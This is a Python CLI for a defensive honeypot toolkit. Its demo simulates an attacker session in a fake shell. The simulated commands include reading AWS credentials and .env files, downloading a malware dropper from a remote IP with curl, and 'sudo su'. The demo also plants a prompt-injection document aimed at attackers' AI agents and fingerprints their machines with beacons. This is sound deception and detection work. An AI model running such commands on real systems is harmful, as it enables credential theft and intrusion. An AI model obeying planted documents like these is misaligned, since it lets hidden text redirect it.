"""Unified CLI Entrypoint for Cloud Honeypot AI & Defense Shield."""

import argparse
import json
import logging
import random
import sys
import time
from typing import List

from cloud_honeypot_ai.ai.cloud_defense import CLOUD_DEFENSE
from cloud_honeypot_ai.ai.threat_analyzer import THREAT_ANALYZER
from cloud_honeypot_ai.config import CONFIG
from cloud_honeypot_ai.core.fake_shell import FakeShell
from cloud_honeypot_ai.core.honeypot_manager import HoneypotManager
from cloud_honeypot_ai.core.session import GLOBAL_SESSION_MANAGER
from cloud_honeypot_ai.crypto.canary_keys import CANARY_GENERATOR
from cloud_honeypot_ai.crypto.posture_auditor import CRYPTO_AUDITOR
from cloud_honeypot_ai.crypto.vault import CRYPTO_VAULT
from cloud_honeypot_ai.deception.canary_api_tracker import CANARY_GPS_TRACKER
from cloud_honeypot_ai.deception.defensive_prompt_poison import DEFENSIVE_POISONER
from cloud_honeypot_ai.deception.honey_database import HONEY_DB_GENERATOR
from cloud_honeypot_ai.deception.telemetry_beacon import TELEMETRY_BEACON_MGR
from cloud_honeypot_ai.web.app import DashboardServer

# Configure clean CLI logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("honeypot.cli")


def cmd_start(args) -> None:
    """Start honeypot listeners and web dashboard."""
    print("=" * 70)
    print("🛡️  CLOUD HONEYPOT AI SHIELD - ARMADILHA PARA HACKERS")
    print("=" * 70)
    print(f"[*] Node Hostname:       {CONFIG.hostname}")
    print(f"[*] Cloud Provider:      {CONFIG.cloud_provider}")
    print(f"[*] SSH Decoy Port:      {args.ssh_port}")
    print(f"[*] TCP/Telnet Port:     {args.tcp_port}")
    print(f"[*] HTTP Web Decoy Port: {args.http_port}")
    print(f"[*] Web Dashboard Port:  {args.dashboard_port}")
    print(f"[*] Weak Honey Passwords: {', '.join(sorted(CONFIG.weak_passwords)[:4])}...")
    print("=" * 70)

    mgr = HoneypotManager()
    mgr.start_all(enable_ssh=True, enable_tcp=True, enable_http=True)

    dash = DashboardServer(port=args.dashboard_port)
    dash.start()

    print(f"\n[+] Honeypot active! Connect using:")
    print(f"    - TCP/Telnet: nc localhost {args.tcp_port}")
    print(f"    - SSH:        ssh -p {args.ssh_port} root@localhost")
    print(f"    - HTTP:       curl http://localhost:{args.http_port}/.env")
    print(f"    - Dashboard:  http://localhost:{args.dashboard_port}")
    print("\n[!] Press Ctrl+C to terminate services.\n")

    try:
        while True:
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n[*] Terminating services...")
        mgr.stop_all()
        dash.stop()
        print("[+] All honeypot services stopped cleanly.")


def cmd_demo(args) -> None:
    """Run an automated end-to-end hacker simulation and threat response demonstration."""
    print("=" * 75)
    print("🚀 RUNNING END-TO-END DEMONSTRATION: 'A ARMADILHA PARA HACKERS' + AI + CRYPTO")
    print("=" * 75)

    # 1. Attacker connects
    attacker_ip = "194.26.29.42"
    attacker_port = 54320
    print(f"\n[Step 1] Attacker probe detected from IP: {attacker_ip} (Port {attacker_port})")

    session = GLOBAL_SESSION_MANAGER.create_session(
        remote_ip=attacker_ip,
        remote_port=attacker_port,
        protocol="SSH",
    )
    geo = session.geo or {}
    print(f"         Location: {geo.get('city')}, {geo.get('country')} ({geo.get('asn')} - {geo.get('isp')})")

    # 2. Brute-force password guessing
    print("\n[Step 2] Attacker conducts automated dictionary brute-force attack:")
    attempts = [
        ("root", "123456", False),
        ("root", "toor", False),
        ("admin", "password123", False),
        ("ubuntu", "admin123", True),  # BAIT SUCCESS!
    ]
    for user, pwd, succ in attempts:
        status_str = "SUCCESS (BAIT ACCEPTED)" if succ else "FAILED (401 Incorrect)"
        print(f"         Attempting login -> user: '{user}', password: '{pwd}' => {status_str}")
        session.record_auth_attempt(user, pwd, success=succ, protocol="SSH")
        time.sleep(0.15)

    print(f"\n[Step 3] Attacker enters decoy shell. Simulating attacker recon and payload execution:")
    shell = FakeShell(username="ubuntu")

    hacker_commands = [
        "uname -a",
        "whoami",
        "id",
        "cat /etc/passwd",
        "ifconfig",
        "cat ~/.aws/credentials",  # CANARY TRIGGER!
        "cat /app/.env",            # CANARY TRIGGER!
        "curl -O http://194.26.29.10/malware/dropper.sh",
        "chmod +x dropper.sh",
        "sudo su",                  # PRIVILEGE ESCALATION
    ]

    for cmd in hacker_commands:
        res = shell.execute(cmd)
        session.record_command(cmd, res.stdout, res.canary_triggered)
        preview = res.stdout.strip().replace("\n", " ")[:65]
        canary_alert = f" [!] CANARY BREACH: {res.canary_triggered}" if res.canary_triggered else ""
        print(f"         $ {cmd}")
        print(f"           => Output: {preview}...{canary_alert}")
        time.sleep(0.1)

    session.close()
    GLOBAL_SESSION_MANAGER.save_session_to_disk(session)
    print(f"\n[+] Session closed and saved. Duration: {session.duration_seconds():.2f}s")

    # 4. AI Threat Intelligence Assessment
    print("\n" + "=" * 75)
    print("🧠 [Step 4] AI THREAT INTELLIGENCE ANALYSIS")
    print("=" * 75)
    report = THREAT_ANALYZER.analyze_session(session)
    print(f"Attacker Classification: {report.profile.classification} (Confidence: {report.profile.confidence * 100:.1f}%)")
    print(f"Threat Score:            {report.risk_score}/100 [{report.threat_level}]")
    print(f"Canary Breaches:         {len(report.canary_breaches)} detected")
    print("\nMITRE ATT&CK Mapping:")
    for t in report.mitre_techniques:
        print(f"  * [{t.technique_id}] {t.name:<32} ({t.tactic}) - Severity: {t.severity}")

    print("\nAI Executive Summary:")
    print(f"  {report.executive_summary}")

    # 5. Automated Cloud Defense & Efficiency Optimization
    print("\n" + "=" * 75)
    print("⚡ [Step 5] AUTOMATED CLOUD EFFICIENCY DEFENSE GENERATION")
    print("=" * 75)
    CLOUD_DEFENSE.add_malicious_ip(attacker_ip)
    ruleset = CLOUD_DEFENSE.generate_defense_rules()
    eff = ruleset.efficiency_metrics
    print(f"Blocked Rogue IPs:            {eff.blocked_ips_count}")
    print(f"Estimated Monthly Attacks:    {eff.estimated_attacks_blocked_monthly:,} requests blocked")
    print(f"Avoided Bandwidth Waste:      {eff.bandwidth_saved_gb:.2f} GB")
    print(f"Avoided CloudWatch Ingestion: ${eff.avoided_cloudwatch_cost_usd:.2f} / month")
    print(f"Total Cloud Cost Savings:     ${eff.total_estimated_monthly_savings_usd:.2f} / month")

    print("\nGenerated AWS Network ACL (NACL) Early Drop Command:")
    print(f"  {ruleset.aws_nacl_cli[0] if ruleset.aws_nacl_cli else 'N/A'}")
    print("Generated Linux iptables Rule:")
    print(f"  {ruleset.linux_iptables[0] if ruleset.linux_iptables else 'N/A'}")

    # 6. Cryptographic Evidence Vault Sealing
    print("\n" + "=" * 75)
    print("🔐 [Step 6] FORENSIC CRYPTOGRAPHIC EVIDENCE VAULT")
    print("=" * 75)
    block = CRYPTO_VAULT.seal_session(session.to_dict())
    print(f"Block Index:       #{block.block_index}")
    print(f"AES-256-GCM Nonce: {block.nonce_hex}")
    print(f"SHA-256 Block Hash: {block.block_hash}")
    print(f"HMAC-SHA256 Sig:   {block.hmac_signature}")

    valid, msgs = CRYPTO_VAULT.verify_vault_integrity()
    print(f"Integrity Check:   {'VERIFIED (100% INTACT)' if valid else 'FAILED'}")
    for m in msgs:
        print(f"  - {m}")

    # 7. Cloud Cryptographic Posture Audit
    print("\n" + "=" * 75)
    print("🛡️ [Step 7] CLOUD CRYPTOGRAPHIC POSTURE AUDIT (Inspired by JunctionX)")
    print("=" * 75)
    audit = CRYPTO_AUDITOR.evaluate_environment(
        ssh_ciphers=["chacha20-poly1305@openssh.com", "aes256-gcm@openssh.com", "3des-cbc"],
        ssh_kex=["curve25519-sha256", "diffie-hellman-group1-sha1", "x25519mlkem768"],
        tls_protocols=["TLSv1.2", "TLSv1.3", "TLSv1.0"],
        tls_ciphers=["ECDHE-RSA-AES128-GCM-SHA256", "AES128-SHA"],
        kms_keys=[{"KeyId": "prod-master-key", "KeySpec": "SYMMETRIC_DEFAULT", "KeyRotationEnabled": True}],
    )
    print(f"Crypto Security Score: {audit.security_score}/100 (Grade {audit.grade})")
    print(f"PQC Readiness:         {audit.pqc_readiness_score}% (Post-Quantum Transition)")
    print(f"Total Audit Findings:  {audit.total_findings}")
    for f in audit.findings:
        status_icon = "⚠️" if f.severity in ("CRITICAL", "HIGH") else "ℹ️"
        print(f"  {status_icon} [{f.component}] {f.algorithm}: {f.description}")

    # 8. Active Deception, Living Cells, and Attacker De-anonymization
    print("\n" + "=" * 75)
    print("🎯 [Step 8] ACTIVE DECEPTION: LIVING CELL HONEYTOKENS & BEACON TRACKING")
    print("=" * 75)

    # 8.1 Living Cells in Database Dump
    dump = HONEY_DB_GENERATOR.generate_customers_dump(session_id=session.session_id)
    print(f"Generated Watermarked Database: {dump.table_name}.sql ({dump.total_records} records)")
    print(f"Digital Provenance Hash:         {dump.watermark_hash}")
    print(f"Living Cells Planted ({len(dump.living_cells)}):")
    for cell in dump.living_cells:
        print(f"  * [{cell.token_type}] {cell.label:<38}: {cell.token_value[:35]}...")

    # 8.2 Logical GPS Trigger (Attacker tested API key locally, VPN bypassed)
    gps_key = dump.living_cells[2].token_value
    hacker_real_ip = "177.54.144.92"  # Public broadband in Brazil
    gps_alert = CANARY_GPS_TRACKER.record_trigger(
        api_key=gps_key,
        client_ip=hacker_real_ip,
        user_agent="python-requests/2.31.0",
        headers={"Host": "api.picoas-cloud.internal", "Authorization": f"Bearer {gps_key}"},
    )
    print(f"\n[!] LOGICAL GPS TRIGGERED! Attacker tested key '{gps_key[:22]}...'")
    print(f"    => Attacker DE-ANONYMIZED Real IP: {hacker_real_ip} ({gps_alert.city}, {gps_alert.country} - {gps_alert.asn})")

    # 8.3 Defensive Prompt Injection (Poisoning Attacker's AI Agent)
    poisoned_doc = DEFENSIVE_POISONER.generate_architecture_doc(session_id=session.session_id)
    print(f"\n[!] DEFENSIVE PROMPT INJECTION PLANTED in '{poisoned_doc.file_path}'")
    ai_event = DEFENSIVE_POISONER.record_ai_trigger(
        query_params={"session": session.session_id, "agent_compromised": "true"},
        client_ip=attacker_ip,
        user_agent="AutoGPT-Agent/4.0-Scraper",
    )
    print(f"    => Attacker AI agent neutralized! Error beacon received from {ai_event['client_ip']} (UA: {ai_event['user_agent']})")

    # 8.4 Telemetry Beacon Heartbeat (Stolen Code Executed on Hacker Laptop)
    beacon_alert = TELEMETRY_BEACON_MGR.record_beacon_heartbeat(
        client_ip=hacker_real_ip,
        telemetry_dict={
            "beacon_id": f"beacon_pkg_{session.session_id[:8]}",
            "source_session": session.session_id,
            "hostname": "kali-infiltrator-desktop",
            "os": "Linux 6.1.0-kali9-amd64",
            "local_user": "shadow_operator",
            "machine": "x86_64",
        },
    )
    print(f"\n[!] TELEMETRY BEACON HEARTBEAT RECEIVED!")
    print(f"    => Hacker Machine Fingerprint: Host '{beacon_alert.target_hostname}' | User: '{beacon_alert.target_local_username}' | OS: '{beacon_alert.target_os}'")

    print("\n" + "=" * 75)
    print("✅ DEMO COMPLETE: All components executed and verified successfully!")
    print("=" * 75)


def cmd_deception(args) -> None:
    """Display active deception honeytokens and telemetry beacon alerts."""
    dump = HONEY_DB_GENERATOR.generate_customers_dump(session_id="cli-manual-test")
    doc = DEFENSIVE_POISONER.generate_architecture_doc(session_id="cli-manual-test")
    print(json.dumps(
        {
            "database_dump": dump.to_dict(),
            "poisoned_documentation": doc.to_dict(),
            "active_gps_keys": len(HONEY_DB_GENERATOR.active_gps_keys),
            "gps_alerts_recorded": [a.to_dict() for a in CANARY_GPS_TRACKER.all_triggers()],
            "beacon_alerts_recorded": [b.to_dict() for b in TELEMETRY_BEACON_MGR.all_alerts()],
            "ai_poison_events": DEFENSIVE_POISONER.all_ai_triggers(),
        },
        indent=2,
    ))


def cmd_defend(args) -> None:
    """Generate and display cloud defense rules."""
    ruleset = CLOUD_DEFENSE.generate_defense_rules()
    print(json.dumps(
        {
            "generated_at": ruleset.generated_at,
            "target_ips": ruleset.target_ips,
            "metrics": ruleset.efficiency_metrics.to_dict(),
            "aws_nacl_cli": ruleset.aws_nacl_cli,
            "aws_sg_cli": ruleset.aws_sg_cli,
            "linux_iptables": ruleset.linux_iptables,
        },
        indent=2,
    ))


def cmd_crypto_audit(args) -> None:
    """Run cloud cryptographic posture audit."""
    audit = CRYPTO_AUDITOR.evaluate_environment(
        ssh_ciphers=["chacha20-poly1305@openssh.com", "aes256-gcm@openssh.com", "3des-cbc"],
        ssh_kex=["curve25519-sha256", "diffie-hellman-group1-sha1", "x25519mlkem768"],
        tls_protocols=["TLSv1.2", "TLSv1.3"],
        tls_ciphers=["ECDHE-RSA-AES128-GCM-SHA256"],
        kms_keys=[{"KeyId": "prod-key-1", "KeySpec": "SYMMETRIC_DEFAULT", "KeyRotationEnabled": True}],
    )
    print(json.dumps(audit.to_dict(), indent=2))


def cmd_vault_verify(args) -> None:
    """Verify cryptographic integrity of forensic vault."""
    valid, msgs = CRYPTO_VAULT.verify_vault_integrity()
    print(f"Integrity Valid: {valid}")
    for m in msgs:
        print(f"- {m}")


def main():
    parser = argparse.ArgumentParser(
        description="Cloud Honeypot AI & Adaptive Defense Shield - Armadilha para Hackers"
    )
    subparsers = parser.add_subparsers(dest="command", help="Sub-commands")

    # Start command
    p_start = subparsers.add_parser("start", help="Start all honeypot listeners and web dashboard")
    p_start.add_argument("--ssh-port", type=int, default=CONFIG.ssh_port, help="SSH decoy port (default: 2222)")
    p_start.add_argument("--tcp-port", type=int, default=CONFIG.tcp_port, help="TCP/Telnet decoy port (default: 2323)")
    p_start.add_argument("--http-port", type=int, default=CONFIG.http_port, help="HTTP decoy port (default: 8080)")
    p_start.add_argument("--dashboard-port", type=int, default=CONFIG.dashboard_port, help="Dashboard port (default: 8888)")

    # Demo command
    subparsers.add_parser("demo", help="Execute complete automated end-to-end hacker attack and defense demonstration")

    # Defend command
    subparsers.add_parser("defend", help="Synthesize cloud defense rules and efficiency cost metrics")

    # Crypto audit
    subparsers.add_parser("crypto-audit", help="Run cloud cryptographic posture audit")

    # Vault verify
    subparsers.add_parser("vault-verify", help="Verify forensic evidence vault cryptographic chain")

    # Deception command
    subparsers.add_parser("deception", help="Display active deception living cells, GPS tracking, and telemetry beacons")

    args = parser.parse_args()

    if args.command == "start":
        cmd_start(args)
    elif args.command == "demo":
        cmd_demo(args)
    elif args.command == "defend":
        cmd_defend(args)
    elif args.command == "crypto-audit":
        cmd_crypto_audit(args)
    elif args.command == "vault-verify":
        cmd_vault_verify(args)
    elif args.command == "deception":
        cmd_deception(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
